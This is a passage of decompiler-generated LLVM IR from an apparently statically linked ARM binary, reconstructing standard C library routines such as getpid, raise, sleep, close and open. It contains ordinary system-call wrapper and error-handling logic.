  %v0_15520.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15524.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15520 = inttoptr i32 %v0_15520.pre to i32*
  %v2_15520 = load i32, i32* %v1_15520, align 4
  %v3_15524 = icmp uge i32 %v2_15520, %v1_15524.pre
  store i1 %v3_15524, i1* %cpsr_c.global-to-local, align 1
  %v9_15524 = icmp eq i32 %v2_15520, %v1_15524.pre
  br i1 %v9_15524, label %dec_label_pc_1552c, label %dec_label_pc_15544

dec_label_pc_15540:                               ; preds = %dec_label_pc_1552c
  %v0_15540 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15544

dec_label_pc_15544:                               ; preds = %dec_label_pc_15514, %dec_label_pc_1552c.dec_label_pc_15520_crit_edge, %dec_label_pc_15540
  %v0_15544 = phi i32 [ %v0_15540, %dec_label_pc_15540 ], [ %v2_1552029, %dec_label_pc_15514 ], [ %v2_15520, %dec_label_pc_1552c.dec_label_pc_15520_crit_edge ]
  %v1_15544 = phi i32 [ %v0_15540, %dec_label_pc_15540 ], [ 0, %dec_label_pc_15514 ], [ %v1_15524.pre, %dec_label_pc_1552c.dec_label_pc_15520_crit_edge ]
  %v3_15544 = icmp uge i32 %v0_15544, %v1_15544
  store i1 %v3_15544, i1* %cpsr_c.global-to-local, align 1
  %v9_15544 = icmp eq i32 %v0_15544, %v1_15544
  br i1 %v9_15544, label %dec_label_pc_1554c, label %dec_label_pc_15544.dec_label_pc_154c4_crit_edge

dec_label_pc_15544.dec_label_pc_154c4_crit_edge:  ; preds = %dec_label_pc_15544
  %v0_154c8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_154c4

dec_label_pc_1554c:                               ; preds = %dec_label_pc_15544
  %v2_1554c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1554c, i32* %r4.global-to-local, align 4
  %v1_15550 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15550

; uselistorder directives
  uselistorder i32 %v0_15540, { 1, 0 }
  uselistorder i32 %v1_15524.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_154d4.pre, { 2, 1, 0 }
  uselistorder i32 %v2_154d018, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 0, 5, 7, 6, 1 }
  uselistorder i32 126, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_15544, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1552c, { 1, 0 }
  uselistorder label %dec_label_pc_15514, { 1, 0 }
  uselistorder label %dec_label_pc_154f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_154dc, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15554 = load i32, i32* @r7, align 4
  store i32 %v3_15554, i32* %stack_var_-8, align 4
  %v0_15558 = call i32 @__aeabi_read_tp()
  store i32 %v0_15558, i32* %r0.global-to-local, align 4
  %v1_1555c = add i32 %v0_15558, -1060
  %v2_1555c = inttoptr i32 %v1_1555c to i32*
  %v3_1555c = load i32, i32* %v2_1555c, align 4
  %tmp7 = icmp slt i32 %v3_1555c, 1
  br i1 %tmp7, label %dec_label_pc_1556c, label %dec_label_pc_15590

dec_label_pc_1556c:                               ; preds = %entry
  %v2_15560 = icmp eq i32 %v3_1555c, 0
  br i1 %v2_15560, label %dec_label_pc_15570, label %dec_label_pc_1557c

dec_label_pc_15570:                               ; preds = %dec_label_pc_1556c
  %v1_15570 = add i32 %v0_15558, -1064
  %v2_15570 = inttoptr i32 %v1_15570 to i32*
  %v3_15570 = load i32, i32* %v2_15570, align 4
  store i32 %v3_15570, i32* %r0.global-to-local, align 4
  %v2_15574 = icmp eq i32 %v3_15570, 0
  br i1 %v2_15574, label %bb, label %bb8

dec_label_pc_1557c:                               ; preds = %dec_label_pc_1556c
  br label %bb8

bb:                                               ; preds = %dec_label_pc_15570
  store i32 0, i32* %v2_15570, align 4
  %v0_1558c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_1557c, %dec_label_pc_15570, %bb
  %v0_1558c = phi i32 [ %v3_15570, %dec_label_pc_15570 ], [ %v0_15558, %dec_label_pc_1557c ], [ %v0_1558c.pre, %bb ]
  br label %dec_label_pc_15590

dec_label_pc_15590:                               ; preds = %entry, %bb8
  %v0_15590 = phi i32 [ %v3_1555c, %entry ], [ %v0_1558c, %bb8 ]
  store i32 %v0_15590, i32* %r0.global-to-local, align 4
  %v2_15594 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15594, i32* @r7, align 4
  ret i32 %v0_15590

; uselistorder directives
  uselistorder i32 %v0_15590, { 1, 0 }
  uselistorder i32 %v3_1555c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15590, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1559c = load i32, i32* @r4, align 4
  store i32 %v3_1559c, i32* %stack_var_-20, align 4
  %v0_155a4 = call i32 @__aeabi_read_tp()
  store i32 %v0_155a4, i32* %r0.global-to-local, align 4
  %v1_155a8 = add i32 %v0_155a4, -1064
  %v2_155a8 = inttoptr i32 %v1_155a8 to i32*
  %v3_155a8 = load i32, i32* %v2_155a8, align 4
  store i32 %v3_155a8, i32* %r4.global-to-local, align 4
  %v2_155ac = icmp eq i32 %v3_155a8, 0
  %v1_155b4 = add i32 %v0_155a4, -1060
  %v2_155b4 = inttoptr i32 %v1_155b4 to i32*
  %v3_155b4 = load i32, i32* %v2_155b4, align 4
  store i32 %v3_155b4, i32* %r0.global-to-local, align 4
  br i1 %v2_155ac, label %dec_label_pc_155bc, label %dec_label_pc_155d0

dec_label_pc_155bc:                               ; preds = %entry
  store i32 %v3_155b4, i32* %r4.global-to-local, align 4
  store i32 %v3_155b4, i32* %v2_155a8, align 4
  %v0_155f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_155d0:                               ; preds = %entry
  %v5_155d4 = icmp sgt i32 %v3_155b4, 0
  br i1 %v5_155d4, label %bb28, label %dec_label_pc_155d8

dec_label_pc_155d8:                               ; preds = %dec_label_pc_155d0
  %tmp = bitcast i32 %v3_155b4 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_155d8 = bitcast float %tmp30 to i32
  %v2_155dc = icmp eq i32 %v1_155d8, 0
  br i1 %v2_155dc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_155d8
  store i32 %v3_155a8, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_155d8
  %v2_155e4 = sub i32 0, %v3_155b4
  store i32 %v2_155e4, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_155d0, %dec_label_pc_155bc, %.thread
  %v0_155fc = phi i32 [ %v3_155b4, %dec_label_pc_155d0 ], [ %v0_155f8.pre, %dec_label_pc_155bc ], [ %v3_155a8, %bb ], [ %v2_155e4, %.thread ]
  store i32 %v0_155fc, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_155fc, -4095
  br i1 %tmp31, label %dec_label_pc_15620, label %dec_label_pc_15608

dec_label_pc_15608:                               ; preds = %bb28
  %v0_1560c = call i32 @__aeabi_read_tp()
  %v3_15610 = load i16, i16* @global_var_23068.363, align 2
  %v4_15610 = sext i16 %v3_15610 to i32
  %v0_15614 = load i32, i32* %r2.global-to-local, align 4
  %v1_15614 = sub i32 0, %v0_15614
  store i32 %v1_15614, i32* %r2.global-to-local, align 4
  %v3_15618 = add i32 %v4_15610, %v0_1560c
  %v4_15618 = inttoptr i32 %v3_15618 to i32*
  store i32 %v1_15614, i32* %v4_15618, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15620

dec_label_pc_15620:                               ; preds = %bb28, %dec_label_pc_15608
  %v0_15624 = phi i32 [ %v0_155fc, %bb28 ], [ -1, %dec_label_pc_15608 ]
  %v3_15620 = icmp eq i32 %v0_15624, -1
  store i32 %v0_15624, i32* %r5.global-to-local, align 4
  br i1 %v3_15620, label %dec_label_pc_1562c, label %dec_label_pc_15674

dec_label_pc_1562c:                               ; preds = %dec_label_pc_15620
  %v0_15630 = call i32 @__aeabi_read_tp()
  store i32 %v0_15630, i32* %r0.global-to-local, align 4
  %v3_15634 = load i16, i16* @global_var_23068.363, align 2
  %v4_15634 = sext i16 %v3_15634 to i32
  %v2_15638 = add i32 %v4_15634, %v0_15630
  %v3_15638 = inttoptr i32 %v2_15638 to i32*
  %v4_15638 = load i32, i32* %v3_15638, align 4
  %v7_1563c = icmp eq i32 %v4_15638, 38
  br i1 %v7_1563c, label %dec_label_pc_15648, label %dec_label_pc_1562c.dec_label_pc_15674_crit_edge

dec_label_pc_1562c.dec_label_pc_15674_crit_edge:  ; preds = %dec_label_pc_1562c
  %v0_15674.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15674

dec_label_pc_15648:                               ; preds = %dec_label_pc_1562c
  %v0_15648 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15648, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_15648, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_15648
  %v5_15660 = sub i32 0, %v0_15648
  store i32 %v5_15660, i32* %r2.global-to-local, align 4
  %v7_15664 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1566c.535 to i32), i32 55804) to i32*), align 4
  %v4_15668 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_15668, i32* %r0.global-to-local, align 4
  %v7_1566c = add i32 %v7_15664, %v0_15630
  %v8_1566c = inttoptr i32 %v7_1566c to i32*
  store i32 %v5_15660, i32* %v8_1566c, align 4
  %v0_15670.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_15648, %bb29
  %v0_15670 = phi i32 [ %v0_15670.pre, %bb29 ], [ %v0_15648, %dec_label_pc_15648 ]
  store i32 %v0_15670, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15674

dec_label_pc_15674:                               ; preds = %dec_label_pc_1562c.dec_label_pc_15674_crit_edge, %dec_label_pc_15620, %.thread22
  %v0_15674 = phi i32 [ %v0_15674.pre, %dec_label_pc_1562c.dec_label_pc_15674_crit_edge ], [ %v0_15624, %dec_label_pc_15620 ], [ %v0_15670, %.thread22 ]
  store i32 %v0_15674, i32* %r0.global-to-local, align 4
  %v2_15678 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15678, i32* @r4, align 4
  ret i32 %v0_15674

; uselistorder directives
  uselistorder i32 %v0_15674, { 1, 0 }
  uselistorder i32 %v0_15648, { 1, 2, 0, 3 }
  uselistorder i32 %v0_155fc, { 2, 0, 1 }
  uselistorder i32 %v3_155b4, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_15674, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_15620, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_1568c = load i32, i32* @r4, align 4
  %v6_1568c = load i32, i32* @r5, align 4
  %v9_1568c = load i32, i32* @r6, align 4
  %v12_1568c = load i32, i32* @r7, align 4
  %v15_1568c = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1569c = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_1569c, label %dec_label_pc_156b0, label %dec_label_pc_15724

dec_label_pc_156b0:                               ; preds = %entry
  %v0_156b0 = call i32 @__aeabi_read_tp()
  %v1_156b4 = add i32 %v0_156b0, -1036
  %v2_156b4 = inttoptr i32 %v1_156b4 to i32*
  %v3_156b4 = load i32, i32* %v2_156b4, align 4
  %v1_156b8 = and i32 %v3_156b4, -71
  %v2_156bc = icmp ugt i32 %v1_156b8, 7
  store i1 %v2_156bc, i1* %cpsr_c.global-to-local, align 1
  %v7_156bc = icmp eq i32 %v1_156b8, 8
  %v1_156c0 = add i32 %v0_156b0, -1168
  store i32 %v1_156c0, i32* @r5, align 4
  br i1 %v7_156bc, label %dec_label_pc_156c8, label %dec_label_pc_1579c

dec_label_pc_156c8:                               ; preds = %dec_label_pc_156b0
  %v2_156cc = add i32 %v0_156b0, -624
  %v3_156cc = inttoptr i32 %v2_156cc to i32*
  store i32 -1, i32* %v3_156cc, align 4
  %v0_156d0 = load i32, i32* @r5, align 4
  %v1_156d0 = add i32 %v0_156d0, 132
  store i32 %v1_156d0, i32* @r6, align 4
  br label %dec_label_pc_156d4

dec_label_pc_156d4:                               ; preds = %dec_label_pc_15708.dec_label_pc_156d4_crit_edge, %dec_label_pc_156c8
  %v0_156d8 = phi i32 [ %v0_156d8.pre, %dec_label_pc_15708.dec_label_pc_156d4_crit_edge ], [ %v1_156d0, %dec_label_pc_156c8 ]
  %v0_156d4 = phi i32 [ %v0_15710, %dec_label_pc_15708.dec_label_pc_156d4_crit_edge ], [ %v0_156d0, %dec_label_pc_156c8 ]
  %v1_156d4 = add i32 %v0_156d4, 132
  %v2_156d4 = inttoptr i32 %v1_156d4 to i32*
  %v3_156d4 = load i32, i32* %v2_156d4, align 4
  store i32 %v0_156d8, i32* %r2.global-to-local, align 4
  store i32 %v3_156d4, i32* @r4, align 4
  %v1_156e430 = inttoptr i32 %v0_156d8 to i32*
  %v2_156e431 = load i32, i32* %v1_156e430, align 4
  %v3_156e833 = icmp uge i32 %v2_156e431, %v3_156d4
  store i1 %v3_156e833, i1* %cpsr_c.global-to-local, align 1
  %v9_156e839 = icmp eq i32 %v2_156e431, %v3_156d4
  br i1 %v9_156e839, label %dec_label_pc_156f0, label %dec_label_pc_15708

dec_label_pc_156f0:                               ; preds = %dec_label_pc_156d4, %dec_label_pc_156f0.dec_label_pc_156e4_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_15700 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15700, label %dec_label_pc_15704, label %dec_label_pc_156f0.dec_label_pc_156e4_crit_edge

dec_label_pc_156f0.dec_label_pc_156e4_crit_edge:  ; preds = %dec_label_pc_156f0
  %v0_156e4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_156e8.pre = load i32, i32* @r4, align 4
  %v1_156e4 = inttoptr i32 %v0_156e4.pre to i32*
  %v2_156e4 = load i32, i32* %v1_156e4, align 4
  %v3_156e8 = icmp uge i32 %v2_156e4, %v1_156e8.pre
  store i1 %v3_156e8, i1* %cpsr_c.global-to-local, align 1
  %v9_156e8 = icmp eq i32 %v2_156e4, %v1_156e8.pre
  br i1 %v9_156e8, label %dec_label_pc_156f0, label %dec_label_pc_15708

dec_label_pc_15704:                               ; preds = %dec_label_pc_156f0
  %v0_15704 = load i32, i32* @r4, align 4
  br label %dec_label_pc_15708

dec_label_pc_15708:                               ; preds = %dec_label_pc_156d4, %dec_label_pc_156f0.dec_label_pc_156e4_crit_edge, %dec_label_pc_15704
  %v0_15708 = phi i32 [ %v0_15704, %dec_label_pc_15704 ], [ %v2_156e431, %dec_label_pc_156d4 ], [ %v2_156e4, %dec_label_pc_156f0.dec_label_pc_156e4_crit_edge ]
  %v1_15708 = phi i32 [ %v0_15704, %dec_label_pc_15704 ], [ %v3_156d4, %dec_label_pc_156d4 ], [ %v1_156e8.pre, %dec_label_pc_156f0.dec_label_pc_156e4_crit_edge ]
  %v3_15708 = icmp uge i32 %v0_15708, %v1_15708
  store i1 %v3_15708, i1* %cpsr_c.global-to-local, align 1
  %v9_15708 = icmp eq i32 %v0_15708, %v1_15708
  br i1 %v9_15708, label %dec_label_pc_15710, label %dec_label_pc_15708.dec_label_pc_156d4_crit_edge

dec_label_pc_15708.dec_label_pc_156d4_crit_edge:  ; preds = %dec_label_pc_15708
  %v0_15710 = load i32, i32* @r5, align 4
  %v0_156d8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_156d4

dec_label_pc_15710:                               ; preds = %dec_label_pc_15708
  %v0_15718 = load i32, i32* @r7, align 4
  %v2_15718 = add i32 %v0_15718, 116
  %v3_15718 = inttoptr i32 %v2_15718 to i32*
  %v4_15718 = load i32, i32* %v3_15718, align 4
  store i32 87844, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15718)
  %v0_1572c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15724

dec_label_pc_15724:                               ; preds = %entry, %dec_label_pc_15710
  %v0_1572c = phi i32 [ 0, %entry ], [ %v0_1572c.pre, %dec_label_pc_15710 ]
  %v2_15730 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_15730, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_1573c = call i32 @__libc_sigaction(i32 17, i32 %v0_1572c, i32 %v2_15730)
  %v3_15740 = load i32, i32* %stack_var_-60, align 4
  %v2_15744 = icmp ne i32 %v3_15740, 0
  store i1 %v2_15744, i1* %cpsr_c.global-to-local, align 1
  %v7_15744 = icmp eq i32 %v3_15740, 1
  br i1 %v7_15744, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15724
  %v3_15748 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_15748, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15724, %bb
  call void @__pseudo_cond_branch(i1 %v7_15744, i32 ptrtoint (i32* @global_var_1245c.539 to i32))
  %v2_15758 = ptrtoint i32* %stack_var_-32 to i32
  %v2_15760 = call i32 @__libc_nanosleep(i32 %v2_15758, i32 %v2_15758)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15764 = icmp eq i32 %v2_15760, 0
  br i1 %v2_15764, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_15778 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_15778, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_15788 = load i32, i32* %stack_var_-40, align 4
  %v1_1578c = and i32 %v3_15788, 65536
  store i32 %v1_1578c, i32* %r2.global-to-local, align 4
  %v2_1578c = icmp eq i32 %v1_1578c, 0
  br i1 %v2_1578c, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_1578c, i32 ptrtoint (i32* @global_var_1245c.539 to i32))
  br label %dec_label_pc_1579c

dec_label_pc_1579c:                               ; preds = %dec_label_pc_156b0, %.thread5
  %v0_1579c = load i32, i32* @r4, align 4
  store i32 %v3_1568c, i32* @r4, align 4
  store i32 %v6_1568c, i32* @r5, align 4
  store i32 %v9_1568c, i32* @r6, align 4
  store i32 %v12_1568c, i32* @r7, align 4
  store i32 %v15_1568c, i32* @lr, align 4
  ret i32 %v0_1579c

; uselistorder directives
  uselistorder i32 %v0_15704, { 1, 0 }
  uselistorder i32 %v1_156e8.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1579c, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_15724, { 1, 0 }
  uselistorder label %dec_label_pc_15708, { 2, 1, 0 }
  uselistorder label %dec_label_pc_156f0, { 1, 0 }
}

define i32 @function_157b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_157b0:
  %v0_157b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_157b0, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_157b0
  %v2_157b0 = load i32, i32* @r4, align 4
  %v4_157b0 = lshr i32 %v2_157b0, %arg1
  %v5_157b0 = sub i32 32, %arg1
  %v6_157b0 = shl i32 %v2_157b0, %v5_157b0
  %v7_157b0 = or i32 %v6_157b0, %v4_157b0
  %v9_157b0 = and i32 %v7_157b0, %arg1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_157b0, %bb
  %v0_157b4 = phi i32 [ %arg1, %dec_label_pc_157b0 ], [ %v9_157b0, %bb ]
  ret i32 %v0_157b4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_157d4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_157d4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_157d4 = load i32, i32* @r0, align 4
  ret i32 %v2_157d4

bb1:                                              ; preds = %entry
  %v0_157d8 = call i32 @__syscall_error()
  ret i32 %v0_157d8
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_157e4 = load i32, i32* @global_var_261f4.542, align 4
  %v2_157e8 = icmp eq i32 %v3_157e4, 0
  store i1 %v2_157e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_157e8, label %dec_label_pc_157f0, label %entry.dec_label_pc_1580c_crit_edge

entry.dec_label_pc_1580c_crit_edge:               ; preds = %entry
  %v3_1580c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1580c

dec_label_pc_157f0:                               ; preds = %entry
  %v0_157f0 = load i32, i32* @r7, align 4
  store i32 %v0_157f0, i32* @ip, align 4
  %v0_15800 = load i32, i32* @r0, align 4
  %v2_15800 = icmp ugt i32 %v0_15800, -4097
  %v7_15800 = icmp eq i32 %v0_15800, -4096
  store i1 %v7_15800, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15800, label %bb7, label %bb

bb:                                               ; preds = %bb9, %bb8, %dec_label_pc_1580c, %dec_label_pc_157f0
  %merge = phi i32 [ %v0_15800, %dec_label_pc_157f0 ], [ %v0_15830, %dec_label_pc_1580c ], [ %v0_15840, %bb8 ], [ %v9_15850, %bb9 ]
  ret i32 %merge

bb7:                                              ; preds = %dec_label_pc_157f0
  %v0_15808 = call i32 @__syscall_error()
  br label %dec_label_pc_1580c

dec_label_pc_1580c:                               ; preds = %entry.dec_label_pc_1580c_crit_edge, %bb7
  %v3_1580c = phi i32 [ %v3_1580c.pre, %entry.dec_label_pc_1580c_crit_edge ], [ %v0_15808, %bb7 ]
  %v9_1580c = load i32, i32* @r7, align 4
  store i32 %v9_1580c, i32* %stack_var_-8, align 4
  %v12_1580c = load i32, i32* @lr, align 4
  %v0_15810 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_15810, i32* @ip, align 4
  store i32 %v3_1580c, i32* @r7, align 4
  %v1_1582c = call i32 @__libc_disable_asynccancel(i32 %v0_15810)
  %v0_15830 = load i32, i32* @r7, align 4
  store i32 %v0_15830, i32* @r0, align 4
  %v2_15834 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15834, i32* @r7, align 4
  store i32 %v12_1580c, i32* @lr, align 4
  %v2_15838 = icmp ugt i32 %v0_15830, -4097
  %v7_15838 = icmp eq i32 %v0_15830, -4096
  store i1 %v7_15838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15838, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_1580c
  %v0_15840 = call i32 @__syscall_error()
  %v0_15850 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15850, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_15850 = load i32, i32* @r1, align 4
  %v2_15850 = load i32, i32* @r8, align 4
  %v3_15850 = load i32, i32* @sb, align 4
  %v4_15850 = lshr i32 %v2_15850, %v3_15850
  %v5_15850 = sub i32 32, %v3_15850
  %v6_15850 = shl i32 %v2_15850, %v5_15850
  %v7_15850 = or i32 %v6_15850, %v4_15850
  %v9_15850 = and i32 %v7_15850, %v1_15850
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_15830, { 0, 2, 3, 1 }
  uselistorder i32 %v0_15800, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1580c, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_15864 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_15864, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_15864 = load i32, i32* @r0, align 4
  ret i32 %v2_15864

bb1:                                              ; preds = %entry
  %v0_15868 = call i32 @__syscall_error()
  ret i32 %v0_15868
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_15874 = load i32, i32* @global_var_261f4.542, align 4
  %v2_15878 = icmp eq i32 %v3_15874, 0
  store i1 %v2_15878, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15878, label %dec_label_pc_15880, label %entry.dec_label_pc_1589c_crit_edge

entry.dec_label_pc_1589c_crit_edge:               ; preds = %entry
  %v3_1589c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1589c

dec_label_pc_15880:                               ; preds = %entry
  %v0_15890 = load i32, i32* @r0, align 4
  %v2_15890 = icmp ugt i32 %v0_15890, -4097
  %v7_15890 = icmp eq i32 %v0_15890, -4096
  store i1 %v7_15890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15890, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_1589c, %dec_label_pc_15880
  %merge = phi i32 [ %v0_15890, %dec_label_pc_15880 ], [ %v0_158c0, %dec_label_pc_1589c ], [ %v0_158d0, %bb10 ], [ %v8_158e0, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_15880
  %v0_15898 = call i32 @__syscall_error()
  br label %dec_label_pc_1589c

dec_label_pc_1589c:                               ; preds = %entry.dec_label_pc_1589c_crit_edge, %bb9
  %v3_1589c = phi i32 [ %v3_1589c.pre, %entry.dec_label_pc_1589c_crit_edge ], [ %v0_15898, %bb9 ]
  store i32 %v3_1589c, i32* %stack_var_-24, align 4
  %v9_1589c = load i32, i32* @r2, align 4
  %v12_1589c = load i32, i32* @r3, align 4
  %v15_1589c = load i32, i32* @r7, align 4
  store i32 %v15_1589c, i32* %stack_var_-8, align 4
  %v18_1589c = load i32, i32* @lr, align 4
  %v0_158a0 = call i32 @__libc_enable_asynccancel()
  %v2_158a8 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_1589c, i32* @r2, align 4
  store i32 %v12_1589c, i32* @r3, align 4
  store i32 %v2_158a8, i32* @r7, align 4
  %v1_158bc = call i32 @__libc_disable_asynccancel(i32 %v0_158a0)
  %v0_158c0 = load i32, i32* @r7, align 4
  store i32 %v0_158c0, i32* @r0, align 4
  %v2_158c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_158c4, i32* @r7, align 4
  store i32 %v18_1589c, i32* @lr, align 4
  %v2_158c8 = icmp ugt i32 %v0_158c0, -4097
  %v7_158c8 = icmp eq i32 %v0_158c0, -4096
  store i1 %v7_158c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158c8, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1589c
  %v0_158d0 = call i32 @__syscall_error()
  %v0_158e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_158e0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_158e0 = load i32, i32* @r1, align 4
  %v2_158e0 = load i32, i32* @r8, align 4
  %v3_158e0 = udiv i32 %v2_158e0, 131072
  %v4_158e0 = mul i32 %v2_158e0, 32768
